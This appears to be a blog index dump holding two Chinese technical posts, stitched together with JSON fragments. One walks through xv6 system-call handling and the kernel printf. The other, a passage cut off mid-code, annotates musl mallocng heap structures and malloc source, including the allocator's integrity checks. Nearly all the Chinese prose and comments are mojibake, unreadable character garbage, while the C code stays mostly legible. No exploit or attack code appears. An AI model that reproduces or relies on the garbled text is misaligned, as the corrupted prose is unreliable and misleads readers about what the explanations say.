åˆ°åº•åšäº†ä»€ä¹ˆæ¥è¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨ æ€ä¹ˆè¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨ecall æ˜¯ç”±ç”¨æˆ·è¿›ç¨‹ä¸»åŠ¨é™·å…¥ trap è¯·æ±‚å†…æ ¸å®Œæˆç³»ç»Ÿè°ƒç”¨çš„æ±‡ç¼–æŒ‡ä»¤ å®ƒä¼šä½¿ scause å¯„å­˜å™¨å€¼è®¾ä¸º 8ï¼Œåœ¨ RISC-V ä¸­å®ƒä»£è¡¨ç€ç³»ç»Ÿè°ƒç”¨ åœ¨åˆ‡æ¢åˆ°å†…æ ¸æ€åï¼Œè·³è½¬åˆ° kernel/trap.c çš„ usertrap æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ kernel/trap.c çš„ usertrap æ€ä¹ˆå¤„ç†ç³»ç»Ÿè°ƒç”¨çš„ kernel/trap.c123456789101112131415161718192021222324voidusertrap(void){ // ... // å½“æ£€æŸ¥åˆ° trap åŸå› æ˜¯ç³»ç»Ÿè°ƒç”¨æ—¶ if(r_scause() == 8){ // å…ˆæ£€æŸ¥ç”¨æˆ·è¿›ç¨‹æ˜¯å¦è¢«æ€æ­» if(killed(p)) exit(-1); // æŠŠ epc åŠ  4ï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³è¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹æ—¶å†å»æ‰§è¡Œä¸€æ¬¡ ecall p-&gt;trapframe-&gt;epc += 4; // å¯ç”¨è®¾å¤‡ä¸­æ–­ intr_on(); // å¼€å§‹å¤„ç†ç³»ç»Ÿè°ƒç”¨ syscall(); } // ...} usertrap æ£€æŸ¥åˆ°æ˜¯ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå°† epc çš„å€¼åŠ  4ï¼Œä»¥ä¾¿è¿”å›æ—¶æ‰§è¡Œ ecall åé¢çš„æŒ‡ä»¤ï¼Œç„¶åè·³è½¬åˆ°å¤„ç†ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•° syscall kernel/syscall.c1234567891011121314151617181920212223242526272829303132// å¤„ç†ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°çš„åŸå‹extern uint64 sys_fork(void);extern uint64 sys_exit(void);// ...extern uint64 sys_mkdir(void);extern uint64 sys_close(void);static uint64 (*syscalls[])(void) = {[SYS_fork] sys_fork,[SYS_exit] sys_exit,// ...[SYS_mkdir] sys_mkdir,[SYS_close] sys_close,};voidsyscall(void){ int num; struct proc *p = myproc(); // å–å‡ºç³»ç»Ÿè°ƒç”¨å·ï¼Œæ£€æŸ¥å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æ‰“å°é”™è¯¯ num = p-&gt;trapframe-&gt;a7; if(num &gt; 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) { // å­˜åœ¨åˆ™æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å¤„ç†å‡½æ•°ï¼Œå¹¶æŠŠè¿”å›å€¼å­˜åˆ° a0 ä¸­ï¼Œåé¢ä¼šä¼ é€’ç»™ç”¨æˆ·è¿›ç¨‹ p-&gt;trapframe-&gt;a0 = syscalls[num](); } else { printf(&quot;%d %s: unknown sys call %d\\n&quot;, p-&gt;pid, p-&gt;name, num); p-&gt;trapframe-&gt;a0 = -1; }} syscall ä¼šæ ¹æ®ç”¨æˆ·è¿›ç¨‹æŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨å·æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨å¤„ç†å‡½æ•° æœ€åä¼šç»è¿‡ usertrapretã€userret è¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹ çœæµå°ç»“ecall -&gt; uservec -&gt; usertrap -&gt; syscall -&gt; usertrapret -&gt; userret -&gt; ecall + 4 å…³é”®åœ¨äº syscall æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·è°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å¤„ç†å‡½æ•° æ€ä¹ˆå®ç°å¯å˜å‚æ•° printf å¹¶è¾“å‡ºè¿™é‡Œä»‹ç»å†…æ ¸çš„ printfï¼ˆkernel/printf.cï¼‰ å¯å˜å‚æ•°å…¶å®å¯å˜å‚æ•°æ˜¯ç”± C è¯­è¨€åº“å’Œç¼–è¯‘å™¨æ¥å®ç°çš„ C è¯­è¨€åº“ä¸­ç»™å‡ºäº† va_startã€va_argã€va_end æ¥å£ï¼Œè¿™é‡Œåªç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œæƒ³è¯¦ç»†äº†è§£å¯å‚è€ƒæœ«å°¾çš„é“¾æ¥ï¼Œä¸è¿‡æ˜¯ x86_64 æ¶æ„ï¼ŒåŸç†ç±»ä¼¼ va_listï¼šä¸€ä¸ªå˜é‡ç±»å‹ï¼Œvariable arguments list å¯å˜å‚æ•°åˆ—è¡¨ va_start(v, l)ï¼šåˆå§‹åŒ–å¯å˜å‚æ•°åˆ—è¡¨ï¼Œl ä¸ºå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å va_arg(v, type)ï¼šä»å¯å˜å‚æ•°åˆ—è¡¨ä¸­å–å‡ºä¸€ä¸ªå‚æ•°ï¼Œé¡»æŒ‡å®šå‚æ•°ç±»å‹ va_end(v)ï¼šç»“æŸæ—¶é‡Šæ”¾ va_list å†…å­˜ æˆ‘ä»¬çŸ¥é“ RISC-V å‰ 8 ä¸ªå‚æ•°æ˜¯æ”¾åœ¨ a0-7 å¯„å­˜å™¨ä¸­ï¼Œå®ƒæ˜¯æ€ä¹ˆåˆä»å¯„å­˜å™¨ä¸­å–å€¼åˆä»æ ˆä¸­å–å€¼çš„ ç­”æ¡ˆæ˜¯ç¼–è¯‘å™¨ä¼šå°†é™¤ a0 ä»¥å¤–çš„å¯„å­˜å™¨å…¨éƒ¨å‹åˆ°æ ˆä¸­ï¼Œè¿™æ ·æ‰€æœ‰å‚æ•°éƒ½æ˜¯è¿ç»­å­˜å‚¨åœ¨æ ˆä¸­ï¼Œä¾¿äºå–å€¼ï¼Œä½†æ˜¯ä¸è¦è‡ªå·±å»å–åœ°å€ç„¶åè¾“å‡ºï¼ˆç¬‘ï¼‰ï¼Œè¦ç”¨ C è¯­è¨€åº“çš„æ¥å£ è¾“å‡ºåˆ°ç¡¬ä»¶æ¯æ¬¡è¾“å‡ºæ—¶å°†ä¸€ä¸ªå­—ç¬¦ä¼ ç»™ç¡¬ä»¶ï¼Œç¡¬ä»¶å›æ˜¾ç»™æ§åˆ¶å° å†…æ ¸ä¸­æœ‰ consputc å°±æ˜¯å°†å­—ç¬¦ä¼ ç»™ç¡¬ä»¶çš„å‡½æ•°ï¼Œåœ¨ kernel/console.c ä¸­ kernel/console.c1234567891011voidconsputc(int c){ if(c == BACKSPACE){ // å¦‚æœæ˜¯é€€æ ¼ï¼Œé‚£ä¹ˆå°±è¾“å‡ºå…ˆé€€æ ¼ï¼Œè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œå†é€€æ ¼ uartputc_sync('\\b'); uartputc_sync(' '); uartputc_sync('\\b'); } else { // å¦åˆ™ç›´æ¥è¾“å‡º uartputc_sync(c); }} ä¼ é€’ç»™ç¡¬ä»¶å¯„å­˜å™¨å…·ä½“åœ¨ kernel/uart.c çš„ uartputc_sync å‡½æ•°ä¸­ kernel/uart.c1234567891011121314151617181920voiduartputc_sync(int c){ // å…³é—­ç¡¬ä»¶ä¸­æ–­ push_off(); if(panicked){ for(;;) ; } // ç­‰å¾…ä¹‹å‰çš„å­—ç¬¦ä¼ è¾“å®Œæˆï¼Œç¡¬ä»¶å‡†å¤‡æ¥æ”¶å­—ç¬¦ while((ReadReg(LSR) &amp; LSR_TX_IDLE) == 0) ; // æŠŠå­—ç¬¦å†™å…¥ç¡¬ä»¶ç”¨äºæ¥æ”¶å­—ç¬¦çš„å¯„å­˜å™¨ä¸­ WriteReg(THR, c); // å¼€å¯ç¡¬ä»¶ä¸­æ–­ pop_off();} printfæ¥ä¸‹æ¥çœ‹çœ‹ printf ä»£ç å®ç° kernel/printf.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162voidprintf(char *fmt, ...){ va_list ap; int i, c, locking; char *s; // åŠ é” locking = pr.locking; if(locking) acquire(&amp;pr.lock); if (fmt == 0) panic(&quot;null fmt&quot;); // åˆå§‹åŒ– ap va_start(ap, fmt); // éå† fmt for(i = 0; (c = fmt[i] &amp; 0xff) != 0; i++){ if(c != '%'){ consputc(c); continue; } c = fmt[++i] &amp; 0xff; if(c == 0) break; switch(c){ // å¦‚æœå‰ä¸€ä¸ªæ˜¯ % æ¥ä¸‹æ¥æ ¹æ®åé¢çš„å­—æ¯è·å–å¯¹åº”ç±»å‹çš„å˜é‡ case 'd': printint(va_arg(ap, int), 10, 1); break; case 'x': printint(va_arg(ap, int), 16, 1); break; case 'p': printptr(va_arg(ap, uint64)); break; case 's': if((s = va_arg(ap, char*)) == 0) s = &quot;(null)&quot;; for(; *s; s++) consputc(*s); break; case '%': consputc('%'); break; default: // å¦‚æœæ˜¯ä¸æ”¯æŒçš„å­—æ¯ï¼Œåˆ™ç›´æ¥è¾“å‡º % å’Œå­—æ¯ consputc('%'); consputc(c); break; } } // é‡Šæ”¾å†…å­˜ va_end(ap); // è§£é” if(locking) release(&amp;pr.lock);} å…¶å®é€»è¾‘æŒºç®€å•çš„ å‚è€ƒæ­ç§˜X86æ¶æ„Cå¯å˜å‚æ•°å‡½æ•°å®ç°åŸç†ï¼šå…¶å®è¿™ç¯‡æ–‡ç« æ‰€è¯´çš„ x86 æŒ‡çš„æ˜¯ x86_64 æ€ä¹ˆæˆåŠŸåˆ›å»ºä¸€ä¸ªè¿›ç¨‹#todo æ€ä¹ˆå®ç°é¡µè¡¨çš„åˆ›å»ºä¸æ›´æ–°#todo æ€ä¹ˆå®ç°è™šæ‹Ÿåœ°å€æ˜ å°„#todo æ€ä¹ˆå®ç°çº¿ç¨‹åˆ‡æ¢","link":"/2023/05/23/Xv6%20%E5%89%96%E6%9E%90/"},{"title":"Musl heap æµ…æ","text":"æµ…æµ…åˆ†æä¸€ä¸‹ å‰è¨€ç¯å¢ƒï¼šx64 musl-1.2.2 ç¬”è€…åªæµ…æµ…åˆ†æäº† malloc å’Œ free çš„æºç ï¼Œå¯¹ç›¸å…³ç»“æ„æ²¡æœ‰è¯¦ç»†ä»‹ç»ï¼Œå¯é…åˆ xf1les å¸ˆå‚…çš„æ–‡ç« é£Ÿç”¨ ç›¸å…³ç»“æ„chunkå®é™…ä¸Šæºç å¹¶æ²¡æœ‰ chunk ç»“æ„ä½“å®šä¹‰ï¼Œä¸‹é¢æ˜¯é€šè¿‡ malloc æ¨æµ‹å‡ºæ¥ 1234567struct chunk { char prev_data[4]; uint8_t idx:5; // group çš„ç¬¬å‡ ä¸ª chunkï¼Œä» 0 å¼€å§‹ uint8_t reserved:3; // chunk æ²¡æœ‰ç”¨åˆ°çš„ç©ºé—´å¤§å°ï¼Œè‹¥ reserved = 5ï¼Œé‚£ä¹ˆä¼šåœ¨ä¸‹ä¸€ä¸ª chunk çš„ prev_data ä¸­è®°å½•çœŸå®çš„ reserved uint16_t offset; // ç›¸å¯¹äºç¬¬ä¸€ä¸ª chunk çš„åç§»ï¼Œå®é™…åœ°å€åç§»ä¸º offset * 0x10 char data[]; // ç”¨æˆ·æ•°æ®}; prev_data ç©ºé—´å¤ç”¨ï¼Œå‰ä¸€ä¸ª chunk å¯ä»¥å¤šä½¿ç”¨ 4 ä¸ªå­—èŠ‚ idx group çš„ç¬¬å‡ ä¸ª chunkï¼Œä» 0 å¼€å§‹ reserved chunk æ²¡æœ‰ç”¨åˆ°çš„ç©ºé—´å¤§å° è‹¥ reserved == 5ï¼Œé‚£ä¹ˆä¼šåœ¨ä¸‹ä¸€ä¸ª chunk çš„ prev_data ä¸­è®°å½•çœŸå®çš„ reserved offset ç›¸å¯¹äºç¬¬ä¸€ä¸ª chunk çš„åç§»ï¼Œå®é™…åœ°å€åç§»ä¸º offset * 0x10 ç”±äºå†…å­˜å¯¹é½ï¼Œæ¯ä¸ª chunk å¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª chunk çš„ 4 å­—èŠ‚ç©ºé—´ ï¼ˆæ¯ä¸ª group çš„ç¬¬ä¸€ä¸ª chunk å‰é¢æœ‰ 0x10 ä¸ªå­—èŠ‚ = group + chunk_headerï¼‰ inuse_chunkavail_mask å’Œ freed_mask å¯¹åº”çš„ä½ç½®éƒ½ä¸º 0 unuse_chunk avail_chunk å†…å®¹ä¸€èˆ¬ä¸ºç©º avail_mask ä¸Š idx å¯¹åº”çš„ä½ç½®ä¸º 1 freed_chunk idx å’Œ reserved ç½®ä¸º 0xffï¼Œoffset ç½®é›¶ freed_mask ä¸Š idx å¯¹åº”çš„ä½ç½®ä¸º 1 group./src/malloc/mallocng/meta.h1234567#define UNIT 16struct group { struct meta *meta; // å¯¹åº”çš„ meta åœ°å€ unsigned char active_idx:5; // last_chunk_idx char pad[UNIT - sizeof(struct meta *) - 1]; // alien unsigned char storage[]; // chunks}; ç”± meta ç®¡ç†ï¼Œä½äºå¯æ‰§è¡Œæ–‡ä»¶çš„æ•°æ®æ®µ meta å¯¹åº”çš„ meta åœ°å€ active_idx å¯ç”¨çš„ chunk çš„æœ€å¤§ idx pad å¡«å……ä½ï¼Œç”¨äºå¯¹é½ storage å­˜å‚¨æ•°æ®ï¼Œchunks meta./src/malloc/mallocng/meta.h123456789struct meta { struct meta *prev, *next; // åŒç±»å‹ä¸”å¯åˆ†é… chunk çš„ meta æˆ– freed_meta ä»¥åŒå‘é“¾è¡¨çš„å½¢å¼è¿æ¥ struct group *mem; // æŒ‡å‘å¯¹åº”çš„ group åœ°å€ volatile int avail_mask, freed_mask; // ä»¥ä½å›¾æ–¹å¼è¡¨ç¤º group ä¸­ chunk çŠ¶æ€ uintptr_t last_idx:5; // group ä¸­ chunk æ•°é‡ uintptr_t freeable:1; // meta æ˜¯å¦å¯ä»¥è¢«å›æ”¶ï¼Œ1 è¡¨ç¤ºå¯ä»¥ uintptr_t sizeclass:6; // ä½œä¸º size_classes çš„ä¸‹æ ‡ï¼Œä¸ºè¯¥ group ä¸­æ¯ä¸ª chunk å¤§å°ï¼ˆByteï¼‰ uintptr_t maplen:8*sizeof(uintptr_t)-12;}; prevï¼Œnext åŒç±»å‹ä¸”å¯åˆ†é… chunk çš„ meta æˆ– freed_meta ä»¥åŒå‘é“¾è¡¨çš„å½¢å¼è¿æ¥ mem æŒ‡å‘å¯¹åº”çš„ group åœ°å€ avail_maskï¼Œfreed_mask ä»¥ä½å›¾æ–¹å¼è¡¨ç¤º group ä¸­ chunk çŠ¶æ€ï¼Œå› æ­¤ä¸€ä¸ª group æœ€å¤šèƒ½æœ‰ 32 ä¸ª chunk 0 è¡¨ç¤º inuseï¼Œ1 è¡¨ç¤º avail æˆ– freed chunk åˆ†ä¸º inuse_chunkã€avail_chunkã€freed_chunk ä¸‰ä¸ªçŠ¶æ€ last_idx group ä¸­ chunk æ•°é‡ freeable meta æ˜¯å¦å¯ä»¥è¢«å›æ”¶ï¼Œ1 è¡¨ç¤ºå¯ä»¥ sizeclass ä½œä¸º size_classes çš„ä¸‹æ ‡ï¼Œä¸ºè¯¥ group ä¸­æ¯ä¸ª chunk å¤§å°ï¼ˆByteï¼‰ ./src/malloc/mallocng/malloc.c1234567891011121314const uint16_t size_classes[] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 18, 20, 25, 31, 36, 42, 50, 63, 72, 84, 102, 127, 146, 170, 204, 255, 292, 340, 409, 511, 584, 682, 818, 1023, 1169, 1364, 1637, 2047, 2340, 2730, 3276, 4095, 4680, 5460, 6552, 8191,}; maplen è‹¥ group æ˜¯ mmap åˆ†é…çš„ç©ºé—´ï¼Œä¸ºå¯¹åº”çš„é•¿åº¦ï¼Œå…¶ä»–æƒ…å†µä¸º 0 avail_metaåœ¨ meta_area ä¸­æŒ‰é¡ºåºå–å‡ºï¼Œavail_meta = {0} freed_meta FIFOï¼Œmalloc_context ä¸­ freed_meta_head æŒ‡å‘ç¬¬ä¸€ä¸ª freed_meta meta-&gt;mem-&gt;meta = 0 freed_meta = {0} meta_area./src/malloc/mallocng/meta.h123456struct meta_area { uint64_t check; // ä¸ malloc_context ä¸­çš„ secret ç›¸ç­‰ï¼Œé˜²æ­¢ä¼ªé€  meta struct meta_area *next; // ä¸‹ä¸€ä¸ª meta_area çš„åœ°å€ int nslots; // meta æ§½çš„æ•°é‡ struct meta slots[]; // metas}; ä»¥é¡µä¸ºå•ä½åˆ†é…ï¼Œæ˜¯å¤šä¸ª meta çš„é›†åˆï¼Œå› æ­¤ meta_area_addr = meta_addr &amp; 0xfffffffffffff000 check ä¸ malloc_context ä¸­çš„ secret ç›¸ç­‰ï¼Œé˜²æ­¢ä¼ªé€  meta next ä¸‹ä¸€ä¸ª meta_area çš„åœ°å€ nslots meta æ§½çš„æ•°é‡ æ³¨ï¼šåœ¨ musl ä¸­ slot å¯èƒ½æŒ‡ meta ä¹Ÿå¯èƒ½æŒ‡ chunk slots å­˜æ”¾å¤šä¸ª meta ç»“æ„ä½“ï¼Œmetas malloc_context./src/malloc/mallocng/meta.h123456789101112131415161718struct malloc_context { uint64_t secret; // é˜²æ­¢ä¼ªé€  meta#ifndef PAGESIZE size_t pagesize;#endif int init_done; // æ˜¯å¦åˆå§‹åŒ–çš„æ ‡è®° unsigned mmap_counter; // è®°å½• mmap å‡ºæ¥çš„ chunk çš„æ•°é‡ struct meta *free_meta_head; // æŒ‡å‘ freed_meta å¤´ struct meta *avail_meta; // æŒ‡å‘ area_areas ä¸­å¯åˆ†é… meta ç©ºé—´ size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift; struct meta_area *meta_area_head, *meta_area_tail; // åˆ†åˆ«æŒ‡å‘ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ª meta_area unsigned char *avail_meta_areas; struct meta *active[48]; // å¯ä»¥åˆ†é…çš„ meta åœ°å€ï¼Œidx å¯¹åº”ç€ size_classes çš„å¤§å°ï¼Œç±»ä¼¼ glibc çš„ bins size_t usage_by_class[48]; // idx å¯¹åº”å¤§å°çš„æ‰€æœ‰ meta çš„ chunk æ•°é‡ uint8_t unmap_seq[32], bounces[32]; uint8_t seq; uintptr_t brk; // è®°å½•ç›®å‰çš„ brk(0)}; ä½äº libc çš„æ•°æ®æ®µï¼Œä¸ºå…¨å±€ç»“æ„ä½“ secret é˜²æ­¢ä¼ªé€  meta free_meta_head æŒ‡å‘ freed_meta å¤´ avail_meta æŒ‡å‘å¯ç”¨ meta æ•°ç»„ active æŒ‡å‘ä¸€ä¸ª meta åŒå‘é“¾è¡¨ï¼Œå…¶ä¸­çš„ meta ä¸€èˆ¬éƒ½æœ‰ unuse_chunk idx å¯¹åº”ç€ size_classes çš„å¤§å°ï¼Œç±»ä¼¼ glibc çš„ bins æŒ‡å‘çš„ç¬¬ä¸€ä¸ª meta ä¸€èˆ¬æœ‰ avail_chunkï¼Œåé¢çš„ meta ä¸€èˆ¬åªæœ‰ freed_chunk usage_by_class idx å¯¹åº”å¤§å°çš„æ‰€æœ‰ meta çš„ group ç®¡ç†çš„ chunk æ•°é‡ brk è®°å½•ç›®å‰çš„ brk(0) chunk -&gt; meta./src/malloc/mallocng/meta.h1234567891011121314151617181920212223242526272829303132static inline struct meta *get_meta(const unsigned char *p){ assert(!((uintptr_t)p &amp; 15)); int offset = *(const uint16_t *)(p - 2); int index = get_slot_index(p); if (p[-4]) { assert(!offset); offset = *(uint32_t *)(p - 8); assert(offset &gt; 0xffff); } const struct group *base = (const void *)(p - UNIT*offset - UNIT); const struct meta *meta = base-&gt;meta; /* check */ assert(meta-&gt;mem == base); assert(index &lt;= meta-&gt;last_idx); assert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index))); assert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index))); const struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096); assert(area-&gt;check == ctx.secret); if (meta-&gt;sizeclass &lt; 48) { assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index); assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)); } else { assert(meta-&gt;sizeclass == 63); } if (meta-&gt;maplen) { assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1); }/* end */ return (struct meta *)meta;} å– chunk çš„ idx å’Œ offset é€šè¿‡ offset å– group é€šè¿‡ group-&gt;meta å– meta å„ç§æ£€æŸ¥ meta-&gt;mem == group idx &lt;= meta-&gt;last_idx meta çš„ mask ä¸Š idx å¯¹åº”çš„ä½ç½®æ˜¯å¦éƒ½ä¸º 0 meta_area-&gt;check == malloc_context.secret size_classes[meta-&gt;sizeclass]*(index) &lt;= offset &lt; size_classes[meta-&gt;sizeclass]*(index+1) å¤§æ¦‚æ€»ç»“ä¸€ä¸‹ malloc_context ä½œä¸ºå…¨å±€å˜é‡ï¼Œåœ¨ libc æ•°æ®æ®µ meta_area ä½œä¸º meta çš„é›†åˆï¼Œç®¡ç†ç€ meta åŒç±»å‹ ä¸” æœ‰å¯åˆ†é… chunk çš„ meta ä»¥åŒå‘é“¾è¡¨å½¢å¼è¿æ¥èµ·æ¥ï¼Œå¦‚æœ meta çš„ chunk å…¨éƒ¨åˆ†é…å‡ºå»ï¼Œåˆ™ä¼šä»åŒå‘é“¾è¡¨ä¸­ç§»å‡º malloc æ—¶ï¼Œé€šè¿‡ malloc_context çš„ active å¯»æ‰¾å¯¹åº”å¤§å°çš„å¯ä½¿ç”¨çš„ metaï¼Œç±»ä¼¼ glibc çš„ bins malloc_context çš„ active æŒ‡å‘çš„ç¬¬ä¸€ä¸ª meta ä¸€èˆ¬æ˜¯æœ‰ avail_chunk æˆ–è€… freed_chunkï¼ˆæˆ–æ‰€æœ‰ chunk åˆšå¥½åˆ†é…å®Œï¼‰ï¼Œæ­¤ meta åé¢çš„ meta ä¸€èˆ¬åªæœ‰ freed_chunk malloc_context çš„ freed_meta_head æŒ‡å‘ freed_meta é“¾è¡¨ mallocmalloc./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108void *malloc(size_t n){ if (size_overflows(n)) return 0; struct meta *g; uint32_t mask, first; // sizeclass int sc; int idx; int ctr; // mmap åˆ†é… // #define MMAP_THRESHOLD 131052 if (n &gt;= MMAP_THRESHOLD) { size_t needed = n + IB + UNIT; void *p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) return 0; wrlock(); step_seq(); g = alloc_meta(); if (!g) { unlock(); munmap(p, needed); return 0; } g-&gt;mem = p; g-&gt;mem-&gt;meta = g; g-&gt;last_idx = 0; g-&gt;freeable = 1; g-&gt;sizeclass = 63; g-&gt;maplen = (needed+4095)/4096; g-&gt;avail_mask = g-&gt;freed_mask = 0; // use a global counter to cycle offset in // individually-mmapped allocations. ctx.mmap_counter++; idx = 0; goto success; } // æ ¹æ® n å– size_classes å¯¹åº”å¤§å°çš„ä¸‹æ ‡ sc = size_to_class(n); rdlock(); /* å¯»æ‰¾åˆé€‚çš„ meta */ // è·å–å¯¹åº”å¤§å°çš„ meta g = ctx.active[sc]; // use coarse size classes initially when there are not yet // any groups of desired size. this allows counts of 2 or 3 // to be allocated at first rather than having to start with // 7 or 5, the min counts for even size classes. // å¦‚æœæ²¡æœ‰å¯¹åº”çš„ metaï¼Œä¸” 4 &lt;= sc &lt; 32 ä¸” sc !=6 ä¸” sc ä¸ºå¶æ•° ä¸”å¯¹åº”å¤§å°çš„æ‰€æœ‰ chunk æ•°é‡ä¸º 0 if (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) { // ä½¿ç”¨æ›´å¤§ä¸€ç‚¹ï¼ˆsc+1ï¼‰çš„ meta size_t usage = ctx.usage_by_class[sc|1]; // if a new group may be allocated, count it toward // usage in deciding if we can use coarse class. // å¦‚æœ sc+1 å¯¹åº”çš„ meta ä¹Ÿä¸å­˜åœ¨æˆ–å­˜åœ¨ä½†æ²¡æœ‰å¯ç”¨çš„ chunk åˆ™ usage+3 if (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask)) usage += 3; // å¦‚æœ usage &lt;= 12 åˆ™ sc+1 if (usage &lt;= 12) sc |= 1; g = ctx.active[sc]; }/* end *//* å¯»æ‰¾å¯åˆ†é…çš„ chunk */ for (;;) { mask = g ? g-&gt;avail_mask : 0; // å–æœ€ä½ä½çš„ 1ï¼Œå³å–å¯ç”¨çš„ idx æœ€å°çš„ chunkï¼Œæ²¡æœ‰åˆ™ä¸º 0 first = mask&amp;-mask; // è‹¥æ— å¯ç”¨ chunkï¼Œåˆ™è·³å‡ºå¾ªç¯ if (!first) break; // è‹¥æ²¡æœ‰å…¶ä»–é—®é¢˜ï¼Œåˆ™åœ¨ avail_mask ä¸­å°†å¯¹åº” chunk çš„é‚£ä¸€ bit ä½ç½®é›¶ if (RDLOCK_IS_EXCLUSIVE || !MT) g-&gt;avail_mask = mask-first; else if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) continue; // è®¡ç®—å‡ºå¯¹åº”çš„ chunk idx idx = a_ctz_32(first); goto success; } upgradelock(); // å¦‚æœæ²¡æœ‰åˆé€‚çš„ chunkï¼Œåˆ™è¿›ä¸€æ­¥åˆ†é…ï¼Œè·å– chunk ä¸‹æ ‡ idx = alloc_slot(sc, n); if (idx &lt; 0) { unlock(); return 0; } // æ›´æ–°ä¸ºå³å°†ä½¿ç”¨çš„ meta g = ctx.active[sc];/* end */ success: ctr = ctx.mmap_counter; unlock(); return enframe(g, idx, n, ctr);} å°† size è½¬åŒ–ä¸ºå¯¹åº”çš„ size_classes çš„ä¸‹æ ‡ sc å– ctx.active[sc] ç¬¬ä¸€ä¸ª metaï¼Œå–å…¶ avail_mask ä¸­ idx æœ€å°çš„ chunk å¦‚æœæ²¡æœ‰åˆ™è¿›å…¥ alloc_slot åšè¿›ä¸€æ­¥åˆ†é… alloc_slot./src/malloc/mallocng/malloc.c12345678910111213static int alloc_slot(int sc, size_t req){ uint32_t first = try_avail(&amp;ctx.active[sc]); if (first) return a_ctz_32(first); // å¦‚æœé“¾è¡¨ä¸­éƒ½æ²¡æœ‰å¯ç”¨çš„ chunkï¼Œåˆ™é‡æ–°ç”³è¯·ä¸€ä¸ª group struct meta *g = alloc_group(sc, req); if (!g) return -1; g-&gt;avail_mask--; queue(&amp;ctx.active[sc], g); return 0;} è¿›å…¥ try_avail å°è¯•ä» ctx.active[sc] å¯¹åº”çš„ meta é“¾è¡¨ä¸­å¯»æ‰¾å¯åˆ†é…çš„ chunk æ²¡æœ‰åˆ™è¿›å…¥ alloc_group å†ç”³è¯·ä¸€ä¸ª meta å’Œ group try_avail./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869static uint32_t try_avail(struct meta **pm){ struct meta *m = *pm; uint32_t first; if (!m) return 0; uint32_t mask = m-&gt;avail_mask; // è‹¥æ²¡æœ‰å¯åˆ†é…çš„ chunk if (!mask) { if (!m) return 0; if (!m-&gt;freed_mask) { /* ä¸”ä¹Ÿæ²¡æœ‰ freed chunkï¼Œå³ group ä¸­çš„ chunk éƒ½æ˜¯ inuse åˆ™å°†è¯¥ meta ä» ctx.active[sc] å’Œ åŒå‘é“¾è¡¨ä¸­ç§»é™¤ */ dequeue(pm, m); m = *pm; if (!m) return 0; } else { // ä¼˜å…ˆä½¿ç”¨ä¸‹ä¸€ä¸ª meta çš„ freed_chunk m = m-&gt;next; *pm = m; } mask = m-&gt;freed_mask; // skip fully-free group unless it's the only one // or it's a permanently non-freeable group // è·³è¿‡æ‰€æœ‰ chunk éƒ½æ˜¯ freed_chunk ä¸”å¯ free çš„ metaï¼Œä¸€èˆ¬ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µ if (mask == (2u&lt;&lt;m-&gt;last_idx)-1 &amp;&amp; m-&gt;freeable) { m = m-&gt;next; *pm = m; mask = m-&gt;freed_mask; } // activate more slots in a not-fully-active group // if needed, but only as a last resort. prefer using // any other group with free slots. this avoids // touching &amp; dirtying as-yet-unused pages. /* æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œå¦‚æœç¬¬ä¸€ä¸ª meta çš„ chunk éƒ½æ˜¯ inuseï¼Œ ä¸”ç¬¬äºŒä¸ª meta çš„ freed_chunk ä½¿ç”¨å®Œäº†ï¼Œæ‰è¿›å…¥ä¸‹é¢çš„æ“ä½œ å¯èƒ½æ˜¯ä»€ä¹ˆç‰¹æ®Šæƒ…å†µï¼Œæ­£å¸¸ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µ*/ if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1))) { if (m-&gt;next != m) { m = m-&gt;next; *pm = m; } else { int cnt = m-&gt;mem-&gt;active_idx + 2; int size = size_classes[m-&gt;sizeclass]*UNIT; int span = UNIT + size*cnt; // activate up to next 4k boundary while ((span^(span+size-1)) &lt; 4096) { 